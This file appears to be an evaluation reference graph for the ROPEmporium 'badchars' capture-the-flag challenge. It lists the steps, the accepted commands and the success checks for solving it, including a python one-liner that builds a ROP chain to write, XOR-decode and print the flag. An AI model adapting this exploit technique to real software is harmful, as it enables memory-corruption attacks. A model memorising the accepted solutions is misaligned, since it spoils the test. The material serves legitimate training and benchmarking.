@@ -1,0 +1,156 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: ropemporium_badchars
+  name: ROPEmporium badchars
+  description: Write an encoded version of "flag.txt" into writable memory, repair
+    the bad characters in memory with gadgets, then call print_file().
+attacker_context:
+  user: ctf-player
+  access:
+    method: local_shell
+    credentials: null
+  target:
+    host: local
+    path: <path-to-challenge-binary>
+    architecture: <challenge-architecture>
+    os: linux
+goal:
+  node: node7
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- man ropper
+- python3
+- python
+- bash
+- sh
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Overflow offset identified
+- id: node1
+  type: state
+  label: Bad characters identified
+- id: node2
+  type: state
+  label: Writable memory identified
+- id: node3
+  type: state
+  label: Write gadget identified
+- id: node4
+  type: state
+  label: Decode gadget identified
+- id: node5
+  type: state
+  label: print_file located
+- id: node6
+  type: state
+  label: Encoded-write payload crafted
+- id: node7
+  type: state
+  label: Flag printed
+edges:
+- action: determine_overflow_offset
+  accepted_commands:
+  - gdb -q ./badchars
+  - ragg2 -P 200 -r > pattern.txt && ./badchars < pattern.txt
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge0
+  from: start
+  to: node0
+- action: identify_badchars
+  accepted_commands:
+  - ./badchars
+  - strings -a badchars | grep badchars
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*badchars.*|.*bad characters.*
+    stderr_regex: .*
+  id: edge1
+  from: node0
+  to: node1
+- action: identify_writable_memory_region
+  accepted_commands:
+  - readelf -S badchars
+  - rabin2 -S badchars
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*\.data.*|.*\.bss.*
+    stderr_regex: .*
+  id: edge2
+  from: node1
+  to: node2
+- action: find_write_gadget
+  accepted_commands:
+  - ROPgadget --binary badchars | grep "mov .*\[.*\].*"
+  - ropper --file badchars --search "mov ["
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*mov.*
+    stderr_regex: .*
+  id: edge3
+  from: node2
+  to: node3
+- action: find_decode_or_xor_gadget
+  accepted_commands:
+  - ROPgadget --binary badchars | grep xor
+  - ropper --file badchars --search xor
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*xor.*
+    stderr_regex: .*
+  id: edge4
+  from: node3
+  to: node4
+- action: locate_print_file
+  accepted_commands:
+  - objdump -d badchars | grep print_file
+  - rabin2 -i badchars | grep print_file
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*print_file.*
+    stderr_regex: .*
+  id: edge5
+  from: node4
+  to: node5
+- action: craft_encoded_write_and_decode_payload
+  accepted_commands:
+  - python3 -c "from struct import pack; import sys; pad=b'A'*40; encoded=b'dnce,vzv';
+    data=0xDATA_ADDR; pop_r12_r13_r14_r15=0xPOP_R12_R13_R14_R15_RET; mov_r13_r12=0xMOV_QWORD_PTR_R13_R12_RET;
+    xor_r15_r14b=0xXOR_BYTE_PTR_R15_R14B_RET; pop_rdi=0xPOP_RDI_RET; print_file=0xPRINT_FILE;
+    key=0x02; chain=pad + pack('<Q', pop_r12_r13_r14_r15)+encoded+pack('<Q', data)+pack('<Q',
+    key)+pack('<Q', data)+pack('<Q', mov_r13_r12); chain += b''.join(pack('<Q', pop_r12_r13_r14_r15)+b'JUNKJUNK'+pack('<Q',0)+pack('<Q',
+    key)+pack('<Q', data+i)+pack('<Q', xor_r15_r14b) for i in range(8)); chain +=
+    pack('<Q', pop_rdi)+pack('<Q', data)+pack('<Q', print_file); sys.stdout.buffer.write(chain)"
+    > payload.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge6
+  from: node5
+  to: node6
+- action: execute_payload_and_print_flag
+  accepted_commands:
+  - ./badchars < payload.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*flag.*
+    stderr_regex: .*
+  id: edge7
+  from: node6
+  to: node7
